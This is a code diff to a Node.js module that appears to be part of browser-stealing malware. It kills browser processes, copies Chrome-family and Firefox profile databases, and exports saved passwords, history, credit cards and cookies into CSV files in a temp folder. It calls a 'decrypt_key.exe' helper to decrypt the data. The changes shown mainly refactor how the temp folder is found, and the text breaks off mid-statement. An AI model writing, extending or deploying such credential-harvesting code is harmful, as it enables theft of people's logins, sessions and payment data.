@@ -2,16 +2,16 @@ const { existsSync, copyFileSync, mkdirSync, rmSync } = require('fs');
 const { join, sep } = require('path');
 const { randomFileCreator } = require('../util/dir');
 const { execSync, exec } = require('child_process');
-const { tempFolder } = require('../index');
 const { addDoubleQuotes } = require('../util/string');
 const { sleep } = require('../util/general');
 const { browsers, browsersProcesses } = require('../util/variables');
 const fs = require('fs');
 const csv = require('csv');
+const { getTempFolder } = require('../util/init');
 const sqlite3 = require('sqlite3').verbose();
 
 const filesToDelete = [];
-const toolPath = addDoubleQuotes(join(tempFolder, 'decrypt_key.exe'));
+const toolPath = addDoubleQuotes(join(getTempFolder(), 'decrypt_key.exe'));
 
 /**
  * @param {string} name
@@ -25,8 +25,8 @@ const _ = (name, path, use, filename, dbData, profile = 'Default') => {
   path += join(sep, profile, use);
   if (!existsSync(path)) return;
 
-  if (!existsSync(join(tempFolder, 'Browsers', name))) mkdirSync(join(tempFolder, 'Browsers', name));
-  const file = join(tempFolder, 'Browsers', name, `${filename}.csv`);
+  if (!existsSync(join(getTempFolder(), 'Browsers', name))) mkdirSync(join(getTempFolder(), 'Browsers', name));
+  const file = join(getTempFolder(), 'Browsers', name, `${filename}.csv`);
   const dbFile = randomFileCreator();
   filesToDelete.push(dbFile);
   copyFileSync(path, dbFile);
@@ -39,8 +39,8 @@ const _ff = (path, profile, filename, use, columns, table) => {
   path = join(path, profile, `${use}.sqlite`);
   if (!existsSync(path)) return;
 
-  const db = new sqlite3.Database(path, sqlite3.OPEN_READONLY);
-  const file = join(tempFolder, 'Browsers', 'Mozilla Firefox', `${filename}.csv`);
+  const db = new sqlite3.Database(path);
+  const file = join(getTempFolder(), 'Browsers', 'Mozilla Firefox', `${filename}.csv`);
   const csvFile = csv.stringify({
     columns: columns,
     header: true
@@ -114,13 +114,13 @@ const kill = (processes) => {
   });
 };
 
-if (!existsSync(join(tempFolder, 'Browsers'))) mkdirSync(join(tempFolder, 'Browsers'));
+if (!existsSync(join(getTempFolder(), 'Browsers'))) mkdirSync(join(getTempFolder(), 'Browsers'));
 kill(browsersProcesses).then(() => {
   Object.keys(browsers).forEach(async (browser) => {
     const path = browsers[browser];
     const isFirefox = browser === 'Firefox';
-    if (isFirefox && !existsSync(join(tempFolder, 'Browsers', 'Mozilla Firefox')))
-      mkdirSync(join(tempFolder, 'Browsers', 'Mozilla Firefox'));
+    if (isFirefox && !existsSync(join(getTempFolder(), 'Browsers', 'Mozilla Firefox')))
+      mkdirSync(join(getTempFolder(), 'Browsers', 'Mozilla Firefox'));
     if (existsSync(path)) {
       ['passwords', 'history', 'creditCards', 'cookies'].forEach(fn => {
         (isFirefox ?
